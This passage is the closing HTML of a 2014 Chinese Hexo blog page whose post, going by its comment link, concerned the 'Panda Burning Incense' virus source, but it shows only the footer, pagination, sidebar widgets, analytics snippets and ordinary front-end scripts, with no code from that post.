<li><a href="http://bbs.hackerxfiles.net/forum-10-1.html" target="_blank">【申请意见】</a></li>
</ul>
<p><a href="http://www.miibeian.gov.cn/" target="_blank">京ICP备05044370号</a>|<a href="http://bbs.hackerxfiles.net/archiver/" target="_blank">Archiver</a>|<a href="http://bbs.hackerxfiles.net/sitemap_index.xml" target="_blank">SiteMap</a> |<a href="http://bbs.hackerxfiles.net/wap/" target="_blank">WAP</a>|  <a href="http://www.linezing.com/" target="_blank"><img src="" alt=""></a></p>
<p>GMT+8, 2009-10-28 11:12, Processed in 0.026201 second(s), 4 queries, Gzip enabled.</p>
<p>Powered by <strong>Discuz!</strong> <em>7.0.0</em> © 2001-2009</p>
<p>Designed by <a href="http://54abu.cn/" target="_blank">54Abu.Cn</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span><span class="breadcrumb"><li><a href="/categories/安全/">安全</a></li><li><a href="/categories/安全/X/">X</a></li></span></span> | <span class="tags">Tagged <a href="/tags/X/" class="label label-primary">X</a><a href="/tags/安全/" class="label label-success">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全-X--熊猫烧香源代码-【编程魔方】/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全-X--熊猫烧香源代码-【编程魔方】" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>





<ul id="pagination" class="pagination pagination-lg">
  <li><a class="extend prev" href="/page/82/">&laquo;</a></li><li><a class="page-number" href="/">1</a></li><li><a class="page-number" href="/page/2/">2</a></li><li><span class="space">&hellip;</span></li><li><a class="page-number" href="/page/80/">80</a></li><li><a class="page-number" href="/page/81/">81</a></li><li><a class="page-number" href="/page/82/">82</a></li><li class="active"><li><span class="page-number current">83</span></li><li><a class="page-number" href="/page/84/">84</a></li><li><a class="page-number" href="/page/85/">85</a></li><li><a class="page-number" href="/page/86/">86</a></li><li><span class="space">&hellip;</span></li></li><li><a class="page-number" href="/page/164/">164</a></li><li><a class="page-number" href="/page/165/">165</a></li><li><a class="extend next" href="/page/84/">&raquo;</a></li>
  <div class="clearfix"></div>
</ul></div><!--wapper-->
       </div><!-- ID main-col END -->
       <aside id="sidebar" class="alignright col-sx-6 col-sm-4 col-md-3 col-lg-3">
<div id="widget_search" class="widget panel panel-primary">
    <form action="//google.com/search" method="get" accept-charset="utf-8">
  <div class="input-group">
    <input class="form-control" id="searchbox" type="search" name="q" results="0" placeholder="search">
    <span class="input-group-btn">
      <button class="btn btn-default" type="submit">Go!</button>
    </span>
    <input type="hidden" name="q" value="site:itsolife.com">
  </div>
</form>
</div>

<div id="widget_category" class="widget panel panel-primary">
  <div class="panel-heading">category</div>  <div data-src='category' class='ajax_widgets'>正在加载...</div>
</div>

<div id="widget_recent_posts" class="widget panel panel-primary">
  <div class="panel-heading">recent posts</div>  <div data-src='recent_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_tagcloud" class="widget panel panel-primary">
  <div class="panel-heading">tagcloud</div>  <div data-src='tagcloud' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_latest_update_posts" class="widget panel panel-primary">
  <div class="panel-heading">最近更新</div>  <div data-src='latest_update_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_recent_comments" class="widget panel panel-primary">
  <div class="panel-heading">recent comments</div>  

<div class="list-group-item ds-recent-comments" data-num-items="6" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="50"></div>



</div>

</aside>
       <div class="clearfix"></div>
     </div><!-- row END -->
  </div>
  <footer id="footer" class="container">
  <div class="panel panel-info">
  <section id='footer_widget'></section>  <div class="panel-footer">
  <div id="site-info">
    <span class='author'>
  
  &copy; 2014 RobinChia
  
    &nbsp;&nbsp;</span>
  
  <span id='analytics-51la'></span><span id='analytics-google'>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-48559895-1']);
  _gaq.push(['_trackPageview']);
  _js2load.push({src:('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'});
</script></span><span id='analytics-cnzz'>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_5774006'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s17.cnzz.com/stat.php%3Fid%3D5774006%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</span><span id='analytics-baidu'>
<script>
var _hmt = _hmt || [];
_js2load.push({src:"//hm.baidu.com/hm.js?1442f50724afc42380b51f097c43082c"});
</script>
</span>  </div>
  <div id="copyright">Blog powered by <a href='http://zespia.tw/hexo/'><strong>hexo</strong></a> Theme <strong><a href='https://github.com/chenall/hexo-theme-chenall'>chenall</a></strong>(Some change in it)<span class="pull-right"> 更新时间: <em>2014-03-15 16:55:36</em></span></div>
</div>
<div class="clearfix"></div>


  </div>
  </footer>
  
        <script src="http://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>        
        <script src="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/js/bootstrap.min.js"></script>        
                
        <script src="http://cdn.bootcss.com/prettify/r298/prettify.min.js"></script>    <script type="text/javascript">
   var lang=["bsh", "c", "cc", "cpp", "cs", "csh", "cyc", "cv", "htm", "html",
    "java", "js", "m", "mxml", "perl", "pl", "pm", "py", "rb", "sh",
    "xhtml", "xml", "xsl"];
   var pretty_base='';
   $('script').each(function(){
	var c = $(this).attr('src');
	if (!c)
	    return;
	if (c.match(/(\/)?prettify(\.min)?\.js/i))
	{
	    var index = c.lastIndexOf('/');
	    if (index != -1)
		pretty_base = c.substr(0,index + 1);
	    return false;
	}
   })
   $('pre code').each(function(){
	var c = $(this).attr('class')
	if (!c)
	    return;
	c = c.match(/\s?(lang\-\w+)/i);
	if (c && lang.indexOf(c[1]) == -1)
	{
	    lang.push(c[1]);
	    $.getScript(pretty_base + c[1] + '.min.js');
	}
   })

    $(window).load(function(){
       $("pre").addClass("prettyprint");
       prettyPrint();
    })
</script>    
            <script type="text/javascript">
var duoshuoQuery = {short_name:"robinchia"};
_js2load.push({src:'http://static.duoshuo.com/embed.js',charset:'UTF-8'});
</script>
    
            <!--wumii_relatedItems-->
    
        <script src="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js"></script>    <script type="text/javascript">
(function($){
  $('.entry').each(function(i){
    $(this).find('img').each(function(){
      var alt = this.alt;

      if (alt){
        $(this).before('<span class="caption">' + alt + '</span>');
      }

      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="fancybox' + i + '" />');
    });
  });

  $('.fancybox').fancybox();
})(jQuery);
</script>    
        <script src="http://cdn.bootcss.com/mathjax/2.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>    <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>
    
<script type="text/javascript">
$('.ajax_widgets').each(function(){var src=$(this).attr('data-src');if(src)$(this).load('/widgets/'+src+'.html');});
$.each(_js2load,function(index,obj){loadjs(obj.src,obj.charset)});
</script>

<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>

  </body>
</html>
